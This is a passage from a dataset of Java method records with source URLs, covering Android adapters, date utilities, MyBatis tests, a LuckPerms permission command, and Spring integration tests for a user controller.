["ProjectsListsAdapter", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBindViewHolder(ProjectsListsAdapter.ViewHolder holder, int position) {\n        holder.title.setText(data.get(position).getProjectsName());\n        holder.subtitle.setText(data.get(position).getProjectsDesc());\n        new ThreadLoader(() -> {\n            holder.recyclerView.setLayoutManager(new LinearLayoutManager(activity, LinearLayoutManager.HORIZONTAL, false));\n            holder.adapter = new ProjectsAdapter(data.get(position).getProjects(), activity);\n        }, () -> {\n            holder.recyclerView.setAdapter(holder.adapter);\n        });\n        holder.itemView.setOnClickListener(v -> {\n            Intent intent = new Intent(activity, ProjectsViewActivity.class);\n            intent.putExtra(\"projects\", new Gson().toJson(data.get(position).getProjects()));\n            intent.putExtra(\"title\", data.get(position).getProjectsName());\n            activity.startActivity(intent);\n        });\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/adapter/recyclerview/ProjectsListsAdapter.java", "stars": "4", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 33169, "method_name": "getItemCount", "class_name": "ProjectsListsAdapter", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemCount() {\n        return data.size();\n    }", "url": "https://raw.githubusercontent.com/justneon33/Sketchcode/master/app/src/main/java/com/sketch/code/two/adapter/recyclerview/ProjectsListsAdapter.java", "stars": "4", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["public"]}}, {"id": 33170, "method_name": "getMonthFirstDay", "class_name": "DateUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getMonthFirstDay() {\n        SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n        Calendar calendar = Calendar.getInstance();\n        calendar.set(Calendar.DAY_OF_MONTH, calendar\n                .getActualMinimum(Calendar.DAY_OF_MONTH));\n        calendar.set(Calendar.HOUR, 0);\n        calendar.set(Calendar.MINUTE, 0);\n        calendar.set(Calendar.SECOND, 0);\n        calendar.set(Calendar.HOUR_OF_DAY,0);\n        return sdf.format(calendar.getTime());\n    }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/utils/DateUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33171, "method_name": "getMonthLastDay", "class_name": "DateUtils", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static  String getMonthLastDay(){\n        SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n        Calendar calendar = Calendar.getInstance();\n        calendar.set(Calendar.DAY_OF_MONTH, calendar\n                .getActualMaximum(Calendar.DAY_OF_MONTH));\n        calendar.set(Calendar.HOUR, 23);\n        calendar.set(Calendar.MINUTE,59);\n        calendar.set(Calendar.SECOND, 59);\n        calendar.set(Calendar.HOUR_OF_DAY,23);\n        return sdf.format(calendar.getTime());\n    }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/utils/DateUtils.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33172, "method_name": "setUp", "class_name": "PermissionsTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {\n    // create a SqlSessionFactory\n    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/permissions/mybatis-config.xml\")) {\n      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);\n    }\n\n    // populate in-memory database\n    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n            \"org/apache/ibatis/submitted/permissions/CreateDB.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/permissions/PermissionsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33173, "method_name": "checkNestedResultMapLoop", "class_name": "PermissionsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void checkNestedResultMapLoop() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      final PermissionsMapper mapper = sqlSession.getMapper(PermissionsMapper.class);\n\n      final List<Resource> resources = mapper.getResources();\n      Assertions.assertEquals(2, resources.size());\n\n      final Resource firstResource = resources.get(0);\n      final List<Principal> principalPermissions = firstResource.getPrincipals();\n      Assertions.assertEquals(1, principalPermissions.size());\n\n      final Principal firstPrincipal = principalPermissions.get(0);\n      final List<Permission> permissions = firstPrincipal.getPermissions();\n      Assertions.assertEquals(2, permissions.size());\n\n      final Permission firstPermission = firstPrincipal.getPermissions().get(0);\n      Assertions.assertSame(firstResource, firstPermission.getResource());\n      final Permission secondPermission = firstPrincipal.getPermissions().get(1);\n      Assertions.assertSame(firstResource, secondPermission.getResource());\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/permissions/PermissionsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33174, "method_name": "checkNestedSelectLoop", "class_name": "PermissionsTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void checkNestedSelectLoop() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      final PermissionsMapper mapper = sqlSession.getMapper(PermissionsMapper.class);\n\n      final List<Resource> resources = mapper.getResource(\"read\");\n      Assertions.assertEquals(1, resources.size());\n\n      final Resource firstResource = resources.get(0);\n      final List<Principal> principalPermissions = firstResource.getPrincipals();\n      Assertions.assertEquals(1, principalPermissions.size());\n\n      final Principal firstPrincipal = principalPermissions.get(0);\n      final List<Permission> permissions = firstPrincipal.getPermissions();\n      Assertions.assertEquals(4, permissions.size());\n\n      boolean readFound = false;\n      for (Permission permission : permissions) {\n        if (\"read\".equals(permission.getPermission())) {\n          Assertions.assertSame(firstResource, permission.getResource());\n          readFound = true;\n        }\n      }\n\n      if (!readFound) {\n        Assertions.fail();\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/permissions/PermissionsTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 33175, "method_name": "getLayoutId", "class_name": "Request2Activity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int getLayoutId() {\n        return R.layout.request2;\n    }", "url": "https://raw.githubusercontent.com/guozaizai/myHttpSdkDemo/master/app/src/main/java/myapp/com/xm/myapplication/View/Request2Activity.java", "stars": "9", "class_props": {"extends": "BaseActivity", "implements": null, "modifiers": ["public"]}}, {"id": 33176, "method_name": "initData", "class_name": "Request2Activity", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initData(Bundle savedInstanceState) {\n        tvName = findViewById(R.id.tv_name);\n        btnRequest=findViewById(R.id.btn_request);\n        btnRequestHead = findViewById(R.id.btn_request_head);\n        btnRequest.setOnClickListener(v -> {\n            Api.getInstance().clearHeadMap();\n            Api.getApi().api(new PwdLoginRequest(\"13712345678\", \"123456\"))\n                    .compose(new ComTransformer<>())\n                    .subscribe(request(data -> getData((LoginResult) data)));\n        });\n        btnRequestHead.setOnClickListener(v -> {\n            Api.getInstance().clearApiService();\n            Map<String, String> map = new HashMap<>();\n            map.put(\"token\", \"123456\");\n            Api.getInstance().setHeadMap(map);\n            Api.getApi().api(new PwdLoginRequest(\"13712345678\", \"123456\"))\n                    .compose(new ComTransformer<>())\n                    .subscribe(request(data -> getData((LoginResult) data)));\n        });\n    }", "url": "https://raw.githubusercontent.com/guozaizai/myHttpSdkDemo/master/app/src/main/java/myapp/com/xm/myapplication/View/Request2Activity.java", "stars": "9", "class_props": {"extends": "BaseActivity", "implements": null, "modifiers": ["public"]}}, {"id": 33177, "method_name": "showTitle", "class_name": "Request2Activity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "    protected String showTitle() {\n        return \"\u76f4\u63a5\u7f51\u7edc\u8bf7\u6c42\";\n    }", "url": "https://raw.githubusercontent.com/guozaizai/myHttpSdkDemo/master/app/src/main/java/myapp/com/xm/myapplication/View/Request2Activity.java", "stars": "9", "class_props": {"extends": "BaseActivity", "implements": null, "modifiers": ["public"]}}, {"id": 33178, "method_name": "getData", "class_name": "Request2Activity", "params": ["LoginResult"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void getData(LoginResult loginResult) {\n        tvName.setText(loginResult.toString());\n    }", "url": "https://raw.githubusercontent.com/guozaizai/myHttpSdkDemo/master/app/src/main/java/myapp/com/xm/myapplication/View/Request2Activity.java", "stars": "9", "class_props": {"extends": "BaseActivity", "implements": null, "modifiers": ["public"]}}, {"id": 33179, "method_name": "onCommand", "class_name": "AddPermissionCommand", "params": ["CommandSender", "Command", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {\n        if (args.length != 2) {\n            sender.sendMessage(ChatColor.RED + \"Please specify a player & a permission!\");\n            return true;\n        }\n\n        String playerName = args[0];\n        String permission = args[1];\n\n        // Get an OfflinePlayer object for the player\n        OfflinePlayer player = this.plugin.getServer().getOfflinePlayer(playerName);\n\n        // Player not known?\n        if (player == null) {\n            sender.sendMessage(ChatColor.RED + playerName +  \" has never joined the server!\");\n            return true;\n        }\n\n        // Create a node to add to the player.\n        Node node = Node.builder(permission).build();\n\n        // Load, modify & save the user in LuckPerms.\n        this.luckPerms.getUserManager().modifyUser(player.getUniqueId(), (User user) -> {\n            // Try to add the node to the user.\n            DataMutateResult result = user.data().add(node);\n\n            // Check to see the result of adding the node.\n            if (result.wasSuccessful()) {\n                sender.sendMessage(ChatColor.RED + user.getUsername() + \" now has permission \" + permission + \"!\");\n            } else {\n                sender.sendMessage(ChatColor.RED + user.getUsername() + \" already has that permission!\");\n            }\n        });\n\n        return true;\n    }", "url": "https://raw.githubusercontent.com/LuckPerms/api-cookbook/master/src/main/java/me/lucko/lpcookbook/commands/AddPermissionCommand.java", "stars": "1", "class_props": {"extends": null, "implements": ["CommandExecutor"], "modifiers": ["public"]}}, {"id": 33180, "method_name": "isOlderThan18", "class_name": "UserDTO", "params": [], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isOlderThan18() {\n        return birthDate == null || birthDate.isBefore(LocalDate.now().minusYears(18));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/dto/UserDTO.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33181, "method_name": "create", "class_name": "FactorComparator", "params": ["String", "int", "Comparator<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "FactorComparator<T>", "snippet": "  public static <T> FactorComparator<T> create(final String factorName, final int weight,\n      final Comparator<T> comparator) {\n\n    if (null == factorName || factorName.length() == 0 || weight < 0 || null == comparator) {\n      logger.error(\n          \"failed to create instance of FactorComparator, at least one of the input paramters are invalid\");\n      return null;\n    }\n\n    return new FactorComparator<>(factorName, weight, comparator);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/selector/FactorComparator.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33182, "method_name": "getFactorName", "class_name": "FactorComparator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getFactorName() {\n    return this.factorName;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/selector/FactorComparator.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33183, "method_name": "getWeight", "class_name": "FactorComparator", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getWeight() {\n    return this.weight;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/selector/FactorComparator.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33184, "method_name": "updateWeight", "class_name": "FactorComparator", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void updateWeight(final int value) {\n    this.weight = value;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/selector/FactorComparator.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33185, "method_name": "compare", "class_name": "FactorComparator", "params": ["T", "T"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int compare(final T object1, final T object2) {\n    return this.comparator.compare(object1, object2);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/selector/FactorComparator.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 33186, "method_name": "setup", "class_name": "UserControllerIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setup() {\n        UserController userController = new UserController(userService, userRepository, mailService, leasingService);\n\n        this.restUserMockMvc = MockMvcBuilders.standaloneSetup(userController)\n            .setCustomArgumentResolvers(pageableArgumentResolver)\n            .setControllerAdvice(exceptionTranslator)\n            .setMessageConverters(jacksonMessageConverter)\n            .build();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33187, "method_name": "createEntity", "class_name": "UserControllerIT", "params": ["EntityManager"], "throws": null, "modifiers": ["public", "static"], "return_type": "User", "snippet": "    public static User createEntity(EntityManager em) {\n        User user = new User();\n        user.setLogin(DEFAULT_LOGIN + RandomStringUtils.randomAlphabetic(5));\n        user.setPassword(RandomStringUtils.random(60));\n        user.setActivated(true);\n        user.setEmail(RandomStringUtils.randomAlphabetic(5) + DEFAULT_EMAIL);\n        user.setFirstName(DEFAULT_FIRSTNAME);\n        user.setLastName(DEFAULT_LASTNAME);\n        user.setTel(DEFAULT_TEL);\n        user.setBirthDate(DEFAULT_BIRTHDATE);\n        user.setLangKey(DEFAULT_LANGKEY);\n        user.setBankAccountIBAN(DEFAULT_IBAN);\n        return user;\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33188, "method_name": "initTest", "class_name": "UserControllerIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initTest() {\n        user = createEntity(em);\n        user.setLogin(DEFAULT_LOGIN);\n        user.setEmail(DEFAULT_EMAIL);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33189, "method_name": "createUser", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void createUser() throws Exception {\n        int databaseSizeBeforeCreate = userRepository.findAll().size();\n\n        // Create the User\n        ManagedUserVM managedUserVM = new ManagedUserVM();\n        managedUserVM.setLogin(DEFAULT_LOGIN);\n        managedUserVM.setPassword(DEFAULT_PASSWORD);\n        managedUserVM.setFirstName(DEFAULT_FIRSTNAME);\n        managedUserVM.setLastName(DEFAULT_LASTNAME);\n        managedUserVM.setBirthDate(DEFAULT_BIRTHDATE);\n        managedUserVM.setTel(DEFAULT_TEL);\n        managedUserVM.setEmail(DEFAULT_EMAIL);\n        managedUserVM.setActivated(true);\n        managedUserVM.setLangKey(DEFAULT_LANGKEY);\n        managedUserVM.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));\n        managedUserVM.setBankAccountIBAN(DEFAULT_IBAN);\n\n        restUserMockMvc.perform(post(\"/api/v1/users\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(managedUserVM)))\n            .andExpect(status().isCreated());\n\n        // Validate the User in the database\n        List<User> userList = userRepository.findAll();\n        assertThat(userList).hasSize(databaseSizeBeforeCreate + 1);\n        User testUser = userList.get(userList.size() - 1);\n        assertThat(testUser.getLogin()).isEqualTo(DEFAULT_LOGIN);\n        assertThat(testUser.getFirstName()).isEqualTo(DEFAULT_FIRSTNAME);\n        assertThat(testUser.getLastName()).isEqualTo(DEFAULT_LASTNAME);\n        assertThat(testUser.getEmail()).isEqualTo(DEFAULT_EMAIL);\n        assertThat(testUser.getLangKey()).isEqualTo(DEFAULT_LANGKEY);\n        assertThat(testUser.getTel()).isEqualTo(DEFAULT_TEL);\n        assertThat(testUser.getBirthDate()).isEqualTo(DEFAULT_BIRTHDATE);\n        assertThat(testUser.getBankAccountIBAN()).isEqualTo(DEFAULT_IBAN);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33190, "method_name": "createUserWithExistingId", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void createUserWithExistingId() throws Exception {\n        int databaseSizeBeforeCreate = userRepository.findAll().size();\n\n        ManagedUserVM managedUserVM = new ManagedUserVM();\n        managedUserVM.setId(1L);\n        managedUserVM.setLogin(DEFAULT_LOGIN);\n        managedUserVM.setPassword(DEFAULT_PASSWORD);\n        managedUserVM.setFirstName(DEFAULT_FIRSTNAME);\n        managedUserVM.setLastName(DEFAULT_LASTNAME);\n        managedUserVM.setEmail(DEFAULT_EMAIL);\n        managedUserVM.setActivated(true);\n        managedUserVM.setLangKey(DEFAULT_LANGKEY);\n        managedUserVM.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));\n        managedUserVM.setBankAccountIBAN(DEFAULT_IBAN);\n        // An entity with an existing ID cannot be created, so this API call must fail\n        restUserMockMvc.perform(post(\"/api/v1/users\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(managedUserVM)))\n            .andExpect(status().isBadRequest());\n\n        // Validate the User in the database\n        List<User> userList = userRepository.findAll();\n        assertThat(userList).hasSize(databaseSizeBeforeCreate);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33191, "method_name": "createUserWithExistingLogin", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void createUserWithExistingLogin() throws Exception {\n        // Initialize the database\n        userRepository.saveAndFlush(user);\n        int databaseSizeBeforeCreate = userRepository.findAll().size();\n\n        ManagedUserVM managedUserVM = new ManagedUserVM();\n        managedUserVM.setLogin(DEFAULT_LOGIN);// this login should already be used\n        managedUserVM.setPassword(DEFAULT_PASSWORD);\n        managedUserVM.setFirstName(DEFAULT_FIRSTNAME);\n        managedUserVM.setLastName(DEFAULT_LASTNAME);\n        managedUserVM.setEmail(\"anothermail@localhost\");\n        managedUserVM.setActivated(true);\n        managedUserVM.setLangKey(DEFAULT_LANGKEY);\n        managedUserVM.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));\n        managedUserVM.setBankAccountIBAN(DEFAULT_IBAN);\n        // Create the User\n        restUserMockMvc.perform(post(\"/api/v1/users\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(managedUserVM)))\n            .andExpect(status().isConflict());\n\n        // Validate the User in the database\n        List<User> userList = userRepository.findAll();\n        assertThat(userList).hasSize(databaseSizeBeforeCreate);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33192, "method_name": "createUserWithInvalidAge", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void createUserWithInvalidAge() throws Exception {\n        int databaseSizeBeforeCreate = userRepository.findAll().size();\n\n        ManagedUserVM managedUserVM = new ManagedUserVM();\n        managedUserVM.setLogin(DEFAULT_LOGIN);// this login should already be used\n        managedUserVM.setPassword(DEFAULT_PASSWORD);\n        managedUserVM.setFirstName(DEFAULT_FIRSTNAME);\n        managedUserVM.setLastName(DEFAULT_LASTNAME);\n        managedUserVM.setEmail(DEFAULT_EMAIL);\n        managedUserVM.setTel(DEFAULT_TEL);\n        managedUserVM.setBirthDate(LocalDate.now().minusYears(10));\n        managedUserVM.setActivated(true);\n        managedUserVM.setLangKey(DEFAULT_LANGKEY);\n        managedUserVM.setBankAccountIBAN(DEFAULT_IBAN);\n        managedUserVM.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));\n\n        // Create the User\n        restUserMockMvc.perform(post(\"/api/v1/users\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(managedUserVM)))\n            .andExpect(status().isBadRequest());\n\n        // Validate the User in the database\n        List<User> userList = userRepository.findAll();\n        assertThat(userList).hasSize(databaseSizeBeforeCreate);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33193, "method_name": "createUserWithInvalidTelephoneNumber", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void createUserWithInvalidTelephoneNumber() throws Exception {\n        int databaseSizeBeforeCreate = userRepository.findAll().size();\n\n        ManagedUserVM managedUserVM = new ManagedUserVM();\n        managedUserVM.setLogin(DEFAULT_LOGIN);// this login should already be used\n        managedUserVM.setPassword(DEFAULT_PASSWORD);\n        managedUserVM.setFirstName(DEFAULT_FIRSTNAME);\n        managedUserVM.setLastName(DEFAULT_LASTNAME);\n        managedUserVM.setEmail(DEFAULT_EMAIL);\n        managedUserVM.setTel(\"+43abc6363636363\");\n        managedUserVM.setBirthDate(DEFAULT_BIRTHDATE);\n        managedUserVM.setActivated(true);\n        managedUserVM.setLangKey(DEFAULT_LANGKEY);\n        managedUserVM.setBankAccountIBAN(DEFAULT_IBAN);\n        managedUserVM.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));\n\n        // Create the User\n        restUserMockMvc.perform(post(\"/api/v1/users\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(managedUserVM)))\n            .andExpect(status().isBadRequest());\n\n        // Validate the User in the database\n        List<User> userList = userRepository.findAll();\n        assertThat(userList).hasSize(databaseSizeBeforeCreate);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33194, "method_name": "createUserWithExistingEmail", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void createUserWithExistingEmail() throws Exception {\n        // Initialize the database\n        userRepository.saveAndFlush(user);\n        int databaseSizeBeforeCreate = userRepository.findAll().size();\n\n        ManagedUserVM managedUserVM = new ManagedUserVM();\n        managedUserVM.setLogin(\"anotherlogin\");\n        managedUserVM.setPassword(DEFAULT_PASSWORD);\n        managedUserVM.setFirstName(DEFAULT_FIRSTNAME);\n        managedUserVM.setLastName(DEFAULT_LASTNAME);\n        managedUserVM.setEmail(DEFAULT_EMAIL);// this email should already be used\n        managedUserVM.setActivated(true);\n        managedUserVM.setLangKey(DEFAULT_LANGKEY);\n        managedUserVM.setBankAccountIBAN(DEFAULT_IBAN);\n        managedUserVM.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));\n\n        // Create the User\n        restUserMockMvc.perform(post(\"/api/v1/users\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(managedUserVM)))\n            .andExpect(status().isConflict());\n\n        // Validate the User in the database\n        List<User> userList = userRepository.findAll();\n        assertThat(userList).hasSize(databaseSizeBeforeCreate);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33195, "method_name": "createUserWithPreviouslyDeletedUsername", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void createUserWithPreviouslyDeletedUsername() throws Exception {\n        // Initialize the database\n        userRepository.saveAndFlush(user);\n\n        // Delete the user\n        restUserMockMvc.perform(delete(\"/api/v1/users/{login}\", user.getLogin())\n            .accept(TestUtil.APPLICATION_JSON_UTF8))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isNoContent());\n\n        ManagedUserVM managedUserVM = new ManagedUserVM();\n        managedUserVM.setLogin(DEFAULT_LOGIN); // The login that is re-used\n        managedUserVM.setPassword(DEFAULT_PASSWORD);\n        managedUserVM.setFirstName(DEFAULT_FIRSTNAME);\n        managedUserVM.setLastName(DEFAULT_LASTNAME);\n        managedUserVM.setEmail(\"another@email.com\");\n        managedUserVM.setActivated(true);\n        managedUserVM.setLangKey(DEFAULT_LANGKEY);\n        managedUserVM.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));\n        managedUserVM.setBankAccountIBAN(DEFAULT_IBAN);\n\n        // Create the User\n        restUserMockMvc.perform(post(\"/api/v1/users\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(managedUserVM)))\n            .andExpect(status().isCreated());\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33196, "method_name": "createUserWithPreviouslyDeletedEmail", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void createUserWithPreviouslyDeletedEmail() throws Exception {\n        // Initialize the database\n        userRepository.saveAndFlush(user);\n\n        // Delete the user\n        restUserMockMvc.perform(delete(\"/api/v1/users/{login}\", user.getLogin())\n            .accept(TestUtil.APPLICATION_JSON_UTF8))\n            .andDo(MockMvcResultHandlers.print())\n            .andExpect(status().isNoContent());\n\n        ManagedUserVM managedUserVM = new ManagedUserVM();\n        managedUserVM.setLogin(\"another_login\");\n        managedUserVM.setPassword(DEFAULT_PASSWORD);\n        managedUserVM.setFirstName(DEFAULT_FIRSTNAME);\n        managedUserVM.setLastName(DEFAULT_LASTNAME);\n        managedUserVM.setEmail(DEFAULT_EMAIL); // The email that is re-used\n        managedUserVM.setActivated(true);\n        managedUserVM.setLangKey(DEFAULT_LANGKEY);\n        managedUserVM.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));\n        managedUserVM.setBankAccountIBAN(DEFAULT_IBAN);\n\n        // Create the User\n        restUserMockMvc.perform(post(\"/api/v1/users\")\n            .contentType(TestUtil.APPLICATION_JSON_UTF8)\n            .content(TestUtil.convertObjectToJsonBytes(managedUserVM)))\n            .andExpect(status().isCreated());\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33197, "method_name": "getAllUsers", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAllUsers() throws Exception {\n        // Initialize the database\n        userRepository.saveAndFlush(user);\n\n        // Get all the users\n        restUserMockMvc.perform(get(\"/api/v1/users?sort=id,desc\")\n            .accept(MediaType.APPLICATION_JSON))\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.[*].login\").value(hasItem(DEFAULT_LOGIN)))\n            .andExpect(jsonPath(\"$.[*].firstName\").value(hasItem(DEFAULT_FIRSTNAME)))\n            .andExpect(jsonPath(\"$.[*].lastName\").value(hasItem(DEFAULT_LASTNAME)))\n            .andExpect(jsonPath(\"$.[*].email\").value(hasItem(DEFAULT_EMAIL)))\n            .andExpect(jsonPath(\"$.[*].langKey\").value(hasItem(DEFAULT_LANGKEY)));\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/web/rest/UserControllerIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 33198, "method_name": "getUser", "class_name": "UserControllerIT", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getUser() throws Exception {\n        // Initialize the database\n        userRepository.saveAndFlush(user);\n\n        // Get the user\n        restUserMockMvc.perform(get(\"/api/v1/users/{login}\", user.getLogin()))\n            .andExpect(status().isOk())\n            .andExpect(content().contentType(MediaType.APPLICATION_JSON_UTF8_VALUE))\n            .andExpect(jsonPath(\"$.login\").value(user.getLogin()))\n            